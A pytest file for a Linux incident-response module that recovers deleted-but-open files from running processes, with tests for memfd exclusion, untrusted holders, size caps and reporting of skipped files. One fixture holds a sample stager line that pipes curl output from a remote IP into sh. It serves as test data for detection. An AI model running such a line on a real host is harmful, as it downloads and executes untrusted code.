"""Deleted-but-open file recovery (playbooks/linux/threat_hunting/deleted_file_recovery.py).

The descriptor is the only copy: once the last one closes, the bytes are gone. These tests
create real files, unlink them while holding them open, and assert the contents come back --
the mechanism itself, not a stand-in for it.

The negative cases carry as much weight. An ordinary desktop was measured holding 378 deleted
descriptors; recovering by directory would have copied a user's browser storage into a
forensic bundle. What is asserted below is that ordinary deleted files are left alone and
that everything skipped is still reported, because a file that was not recovered must never
look like a file that was not there.
"""
import json
import os
import subprocess
import sys
import textwrap

import pytest
from conftest import LINUX_HUNT

sys.path.insert(0, LINUX_HUNT)
import deleted_file_recovery as dfr  # noqa: E402


@pytest.fixture
def holder(tmp_path):
    """Spawn a child that creates files, unlinks them, and holds them open until killed.

    Recovery has to happen against a live descriptor in another process -- the same thing
    the collection does on a running host.
    """
    procs = []

    def spawn(files, exe=None):
        """files: {name: bytes}. Returns the child's pid once its fds are open."""
        spec = {str(tmp_path / n): c.decode("latin-1") for n, c in files.items()}
        script = textwrap.dedent("""
            import os, sys, time
            spec = __import__("json").loads(sys.argv[1])
            held = []
            for path, content in spec.items():
                fh = open(path, "w+b")
                fh.write(content.encode("latin-1"))
                fh.flush()
                os.unlink(path)
                held.append(fh)
            print("ready", flush=True)
            time.sleep(120)
        """)
        argv = [exe or sys.executable, "-c", script, json.dumps(spec)]
        p = subprocess.Popen(argv, stdout=subprocess.PIPE, text=True)
        assert p.stdout.readline().strip() == "ready"
        procs.append(p)
        return str(p.pid)

    yield spawn
    for p in procs:
        p.kill()
        p.wait()


def _for_pid(entries, pid):
    return [e for e in entries if e["pid"] == pid]


ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 121 + b"payload-bytes"
SCRIPT = b"#!/bin/sh\ncurl http://203.0.113.77/x | sh\n"
ORDINARY = b"just some cached data, nothing to see\n" * 20


# --- the mechanism ----------------------------------------------------------------------

def test_deleted_elf_content_is_recovered_byte_for_byte(holder, tmp_path):
    pid = holder({"payload.bin": ELF})
    entries, _ = dfr.scan(str(tmp_path))
    mine = _for_pid(entries, pid)
    assert len(mine) == 1
    e = mine[0]
    assert e["recovered"] is True and e["reason"].startswith("executable content (ELF)")
    assert e["original_path"].endswith("payload.bin")
    assert open(os.path.join(tmp_path, e["saved_as"]), "rb").read() == ELF


def test_deleted_script_is_recovered(holder, tmp_path):
    pid = holder({"stage.sh": SCRIPT})
    e = _for_pid(dfr.scan(str(tmp_path))[0], pid)[0]
    assert e["recovered"] is True and "script" in e["reason"]
    assert b"203.0.113.77" in open(os.path.join(tmp_path, e["saved_as"]), "rb").read()


def test_recovered_content_is_hashed_for_custody(holder, tmp_path):
    import hashlib
    pid = holder({"payload.bin": ELF})
    e = _for_pid(dfr.scan(str(tmp_path))[0], pid)[0]
    assert e["sha256"] == hashlib.sha256(ELF).hexdigest()
    assert e["bytes_recovered"] == len(ELF)


# --- what is deliberately left alone ------------------------------------------------------

def test_ordinary_deleted_file_is_not_recovered(holder, tmp_path):
    """The 160-file case. Non-executable content held by an ordinary process is the normal
    state of a running desktop, and copying it is volume and somebody's private data."""
    pid = holder({"cache.dat": ORDINARY})
    assert _for_pid(dfr.scan(str(tmp_path))[0], pid) == []


def test_memfd_holding_elf_bytes_is_not_recovered(tmp_path):
    """A memfd has no file behind it and never had one -- check_memfd owns that signal.

    It reads as "(deleted)" in /proc/<pid>/fd, which is what made 214 of the 378 descriptors
    on the measured host look recoverable. The content is deliberately ELF here, so only the
    memfd filter can be what excludes it.
    """
    script = textwrap.dedent("""
        import os, sys, time
        fd = os.memfd_create("ir-test-region")
        os.write(fd, bytes.fromhex(sys.argv[1]))    # argv cannot carry the NULs directly
        print("ready", flush=True)
        time.sleep(120)
    """)
    p = subprocess.Popen([sys.executable, "-c", script, ELF.hex()],
                         stdout=subprocess.PIPE, text=True)
    try:
        assert p.stdout.readline().strip() == "ready"
        entries, _ = dfr.scan(str(tmp_path))
        assert _for_pid(entries, str(p.pid)) == []
    finally:
        p.kill()
        p.wait()


def test_the_scanner_does_not_recover_its_own_descriptors(tmp_path):
    """A collection must not report its own working files as an intruder's."""
    entries, _ = dfr.scan(str(tmp_path))
    assert all(e["pid"] not in (str(os.getpid()), str(os.getppid())) for e in entries)


# --- untrusted holders --------------------------------------------------------------------

def test_ordinary_file_is_recovered_when_the_holder_is_untrusted(holder, tmp_path):
    """A process running from a deleted binary is holding evidence whatever the content is."""
    staged = tmp_path / "ir-test-interpreter"
    staged.write_bytes(open(sys.executable, "rb").read())
    staged.chmod(0o755)
    pid = holder({"notes.txt": ORDINARY}, exe=str(staged))
    os.unlink(staged)                       # the holder's own binary is now gone from disk
    e = _for_pid(dfr.scan(str(tmp_path))[0], pid)[0]
    assert e["recovered"] is True
    assert "own binary was deleted" in e["reason"]


def test_process_trust_reports_ordinary_processes_as_trusted():
    assert dfr.process_trust(str(os.getpid())) is None


# --- caps, and saying what was skipped ----------------------------------------------------

def test_file_over_the_per_file_cap_is_reported_not_dropped(holder, tmp_path):
    pid = holder({"big.bin": ELF + b"A" * 4096})
    entries, _ = dfr.scan(str(tmp_path), max_file=64)
    e = _for_pid(entries, pid)[0]
    assert e["recovered"] is False
    assert "per-file cap" in e["skipped"] and "IR_DELETED_MAX_BYTES" in e["skipped"]


def test_total_cap_stops_recovery_and_names_the_reason(holder, tmp_path):
    pid = holder({"a.bin": ELF, "b.bin": ELF, "c.bin": ELF})
    entries, _ = dfr.scan(str(tmp_path), max_total=len(ELF) + 1)
    mine = _for_pid(entries, pid)
    assert len(mine) == 3
    assert sum(1 for e in mine if e.get("recovered")) == 1
    assert all("total cap" in e["skipped"] for e in mine if not e.get("recovered"))


def test_a_skipped_file_becomes_a_finding_not_a_silence(holder, tmp_path):
    pid = holder({"big.bin": ELF + b"A" * 4096})
    entries, _ = dfr.scan(str(tmp_path), max_file=64)
    f = dfr.to_findings(_for_pid(entries, pid), denied=0)
    assert [x["Type"] for x in f] == ["Deleted File Not Recovered"]
    assert "only copy" in f[0]["Details"]


def test_unreadable_processes_are_reported(tmp_path):
    """Running as a normal user, other users' fds are not listable.

    Reporting zero recoveries without saying most of the host was unreadable would be a
    clean bill of health nobody earned.
    """
    f = dfr.to_findings([], 12)
    assert f[0]["Type"] == "Deleted File Scan Incomplete"
    assert "run the collection as root" in f[0]["Details"]


# --- findings shape -----------------------------------------------------------------------

def test_executable_recovery_is_high_and_ordinary_is_medium(holder, tmp_path):
    staged = tmp_path / "ir-test-interpreter2"
    staged.write_bytes(open(sys.executable, "rb").read())
    staged.chmod(0o755)
    pid_exec = holder({"payload.bin": ELF})
    pid_plain = holder({"notes.txt": ORDINARY}, exe=str(staged))
    os.unlink(staged)
    entries, denied = dfr.scan(str(tmp_path))
    by_type = {}
    for f in dfr.to_findings(_for_pid(entries, pid_exec) + _for_pid(entries, pid_plain), denied):
        by_type[f["Type"]] = f["Severity"]
    assert by_type["Deleted Executable Recovered"] == "High"
    assert by_type["Deleted File Recovered"] == "Medium"


def test_findings_carry_the_common_schema(holder, tmp_path):
    pid = holder({"payload.bin": ELF})
    entries, denied = dfr.scan(str(tmp_path))
    for x in dfr.to_findings(_for_pid(entries, pid), denied):
        assert set(x) >= {"Timestamp", "Severity", "Type", "Target", "Details", "MITRE"}
        assert x["Source"] == "deleted_file_recovery"
        assert "T1070.004" in x["MITRE"]
